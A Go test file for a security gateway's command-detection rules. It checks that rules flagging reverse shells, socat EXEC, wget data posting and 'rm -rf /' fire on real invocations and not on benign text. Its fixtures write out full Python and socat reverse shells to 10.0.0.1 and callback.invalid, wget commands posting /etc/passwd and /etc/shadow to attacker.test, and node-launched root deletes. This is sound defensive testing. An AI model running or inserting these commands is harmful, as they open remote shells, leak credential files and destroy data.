package gateway

import "testing"

// Three CRITICAL/HIGH command rules used an unbounded `.*`, which spans `;`
// and newlines and therefore matched text belonging to a *different* command
// in the same string. CMD-REVSHELL-PYTHON was the worst: `.*socket.*connect`
// fired CRITICAL on any inline Python that merely mentioned both words.
//
// Bounding the gap to `[^;\n]*` matches the house style already used by
// lateral.workload_exec and privilege.host_namespace_entry in the same file.
func TestCommandRulesDoNotMatchAcrossCommandBoundaries(t *testing.T) {
	benign := []struct{ rule, text string }{
		{"CMD-REVSHELL-PYTHON", `python3 -c "import json;print(json.load(open('a')))"; echo "socket connect"`},
		{"CMD-REVSHELL-PYTHON", `python3 -c "print('parse socket logs')" && grep connect out.txt`},
		{"CMD-REVSHELL-PYTHON", "python3 -c \"print(1)\"\n# socket ... later we connect\n"},
		{"CMD-SOCAT-EXEC", `socat --help; echo EXEC`},
		{"CMD-SOCAT-EXEC", "socat -V\nEXEC is documented above"},
		{"CMD-WGET-POST", `wget https://example.test/f; echo --post-data`},
	}
	for _, profile := range alertFatigueProfiles {
		t.Run(profile, func(t *testing.T) {
			for _, tc := range benign {
				rule := alertFatigueRule(t, profile, tc.rule)
				if firstAcceptedRuleMatch(rule, tc.text) != nil {
					t.Errorf("%s matched across a command boundary: %q", tc.rule, tc.text)
				}
			}
		})
	}
}

// Regression guard: tightening must not create a blind spot. These are the
// real invocations the rules exist to catch.
func TestCommandRulesStillCatchRealInvocations(t *testing.T) {
	malicious := []struct{ rule, text string }{
		{"CMD-REVSHELL-PYTHON", `python -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`},
		{"CMD-REVSHELL-PYTHON", `python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("callback.invalid",9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`},
		// Caught by live probe: a python -c payload is often multi-line, and
		// requiring the conjunction on one line would let a real reverse shell through.
		{"CMD-REVSHELL-PYTHON", "python3 -c \"import os,pty,socket\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn('/bin/bash')\""},
		{"CMD-SOCAT-EXEC", `socat TCP:10.0.0.1:4444 EXEC:/bin/sh`},
		{"CMD-SOCAT-EXEC", `socat tcp-connect:10.0.0.1:4444 EXEC:'bash -li',pty,stderr`},
		{"CMD-WGET-POST", `wget --post-data="x=$(cat /etc/passwd)" https://attacker.test/`},
		{"CMD-WGET-POST", `wget --post-file=/etc/shadow https://attacker.test/`},
	}
	for _, profile := range alertFatigueProfiles {
		t.Run(profile, func(t *testing.T) {
			for _, tc := range malicious {
				rule := alertFatigueRule(t, profile, tc.rule)
				if firstAcceptedRuleMatch(rule, tc.text) == nil {
					t.Errorf("%s no longer detects a real invocation: %q", tc.rule, tc.text)
				}
			}
		})
	}
}

func TestRecursiveRootDeleteNodeEvalExecutionBoundary(t *testing.T) {
	tests := []struct {
		name string
		text string
		want bool
	}{
		{
			name: "console output is data",
			text: `node -e 'console.log("rm -rf /")'`,
		},
		{
			name: "test fixture assignment is data",
			text: `node -e 'const expected = "rm -rf /"; assert.equal(render(), expected)'`,
		},
		{
			name: "exec prints destructive literal instead of executing it",
			text: `node -e 'require("child_process").execSync("printf rm -rf /")'`,
		},
		{
			name: "require execSync executes destructive command",
			text: `node -e 'require("child_process").execSync("rm -rf /")'`,
			want: true,
		},
		{
			name: "child_process exec executes after shell separator",
			text: `node -e 'child_process.exec("echo start && rm -rf /")'`,
			want: true,
		},
		{
			name: "spawnSync shell c executes destructive command",
			text: `node -e 'require("node:child_process").spawnSync("sh", ["-c", "rm -rf /"])'`,
			want: true,
		},
		{
			name: "direct shell command after node eval remains detected",
			text: `node -e 'console.log("safe")'; rm -rf /`,
			want: true,
		},
	}

	for _, profile := range alertFatigueProfiles {
		t.Run(profile, func(t *testing.T) {
			rule := alertFatigueRule(t, profile, "CMD-RM-RF")
			for _, test := range tests {
				t.Run(test.name, func(t *testing.T) {
					got := firstAcceptedRuleMatch(rule, test.text) != nil
					normalized := normalizeShell(test.text)
					if !got && normalized != test.text {
						got = firstAcceptedRuleMatch(rule, normalized) != nil
					}
					if got != test.want {
						t.Fatalf("CMD-RM-RF match = %t, want %t for %q", got, test.want, test.text)
					}
				})
			}
		})
	}
}

func TestPythonInlineReverseShellProofRequiresCompleteConjunction(t *testing.T) {
	tests := []struct {
		name   string
		script string
		want   bool
	}{
		{
			name:   "literal nonlocal INET with fd handoff and pty shell",
			script: `import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")`,
			want:   true,
		},
		{
			name:   "default INET with loop handoff and subprocess shell",
			script: `import os,socket,subprocess;s=socket.socket();s.connect(("callback.invalid",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])`,
			want:   true,
		},
		{
			name:   "socket makefiles reopen all standard streams",
			script: `import os,socket,sys;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("callback.invalid",4444));sys.stdin=s.makefile("r");sys.stdout=s.makefile("w");sys.stderr=s.makefile("w");os.system("/bin/sh")`,
			want:   true,
		},
		{
			name:   "Unix domain socket client",
			script: `import os,pty,socket;s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM);s.connect("/var/run/service.sock");os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")`,
		},
		{
			name:   "ordinary TCP client",
			script: `import socket;s=socket.socket();s.connect(("service.invalid",443));s.sendall(b"ping")`,
		},
		{
			name:   "loopback destination",
			script: `import os,pty,socket;s=socket.socket();s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")`,
		},
		{
			name:   "unresolved dynamic destination",
			script: `import os,pty,socket;s=socket.socket();s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")`,
		},
		{
			name:   "single label destination may be local",
			script: `import os,pty,socket;s=socket.socket();s.connect(("worker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")`,
		},
		{
			name:   "incomplete standard stream handoff",
			script: `import os,pty,socket;s=socket.socket();s.connect(("callback.invalid",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn("/bin/sh")`,
		},
		{
			name:   "no shell execution",
			script: `import os,socket;s=socket.socket();s.connect(("callback.invalid",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)`,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := pythonInlineReverseShellProof(test.script); got != test.want {
				t.Fatalf("pythonInlineReverseShellProof() = %t, want %t", got, test.want)
			}
		})
	}
}
